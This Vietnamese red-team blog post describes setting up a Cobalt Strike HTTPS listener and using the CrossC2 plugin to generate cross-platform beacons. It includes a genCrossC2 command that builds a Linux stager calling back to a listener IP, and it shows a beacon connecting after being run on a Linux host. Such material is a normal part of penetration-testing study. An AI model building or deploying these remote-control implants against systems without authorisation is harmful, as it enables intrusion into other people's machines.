+++
title = "CrossC2 – Generate CobaltStrike’s Cross-Platform Payload"
description = ""
type = ["posts","post"]
tags = [
    "red-team",
    "infosec",
]
date = "2021-11-03"
categories = [
    "red-team",
    "infosec",
]
series = ["red-team"]
[ author ]
  name = "Quac Tran"
+++
* [Introduce](#introduce)
* [Config](#config)
    * [Listener](#listener)
    * [Generate beacon](#generate-beacon)
        * [Gen via command](#gen-via-command)
        * [Gen via install plugin](#gen-via-install-plugin)
* [Result](#result)
* [References](#references)
## Introduce
- "Cobalt Strike is threat emulation software. Execute targeted attacks against modern enterprises with one of the most powerful network attack kits available to penetration testers. This is not compliance testing."

- Nếu như bạn từng sử dụng Cobalt Strike chắc cũng sẽ biết Cobalt Strike không hỗ trợ điều khiển từ xa Linux, MacOS, Android... theo mặc định.

- CrossC2 là một plugin mở rộng hỗ trợ Cobalt Strike điều khiển từ xa các máy chủ Linux, MacOS, Android....Nó hỗ trợ các thư viện động do người dùng chỉ định, tải, thực thi các thư viện này.

- Bạn có thể xem chi tiết về dự án tại đây: https://github.com/gloxec/CrossC2
## Config
### Listener
- Đầu tiên chúng ta sẽ tạo một listener để lắng nghe kết nối từ xa

- Cobalt Strike -> Listener

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/listener.PNG)

- Một điều đáng chú ý ở đây là CrossC2 hiện tại chỉ hỗ trợ Beacon Https. Vậy ta sẽ tạo Beacon HTTPS. Đối với các Beacon khác như HTTP sẽ không thể nhận kết nối.
### Generate beacon
- Ở đây sẽ có 2 phương phương pháp. Chúng ta có thể gen trực tiếp từ binaries mà tác giả đã compile bằng command hoặc install vào Cobalt Strike như một plugin phụ trợ để gen theo dạng Gui. Mình sẽ làm theo cả 2 cách:
#### Gen via command
- Đầu tiên chúng ta sẽ tải binary về tại đây: https://github.com/gloxec/CrossC2/releases

- Cách sử dụng tác giả cũng đã nói rất chi tiết:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/binary.PNG)

- Vì phiên bản Cobalt Strike đang sử dụng là 4.4 nên để gen payload tôi sử dụng lệnh sau:

- `./genCrossC2.Linux IP_Listener 4444 .cobaltstrike.beacon_keys null Linux x64 ./beacon_linux_test stager 4.4`

- cobaltstrike.beacon_keys: được tạo trong cùng thư mục root của Cobalt Strike server khi tạo Listener từ đầu

- Sau khi chạy lệnh thành công tôi nhận được beacon mới trong thư mục hiện tại:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/beacon.PNG)
#### Gen via install plugin
- Đầu tiên chúng ta sẽ tải về:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/save.PNG)

- Và đừng quên tải xuống: https://github.com/gloxec/CrossC2/blob/cs4.1/CrossC2Kit/CrossC2Kit_Loader.cna (including memory loading and other functions)

- Trong CrossC2.cna chúng ta sẽ chỉnh sửa lại path đến binary gen payload và cobaltstrike.beacon_keys cho phù hợp:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/edit.PNG)

- Sau đó chúng ta sẽ tải plugin vào Cobalt Strike: Cobalt Strike -> Script Manager -> Load. Sau khi load xong chúng ta sẽ có thêm chức năng CrossC2 trên thanh Menu. Lúc này ta có thể sử dụng để gen payload:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/menu.PNG)

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/gen.PNG)
## Result
- Sau khi download và thực thi payload tạo dựa trên command hay GUI trên máy chủ Linux:

- ![https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cross-platform-cobalt-strike/run.PNG)

- Chúng ta có thể làm tương tự để nhận kết nối tự MacOS, Android...
## References

-[https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html](https://gloxec.github.io/CrossC2/zh_cn/usage/genCross.html)

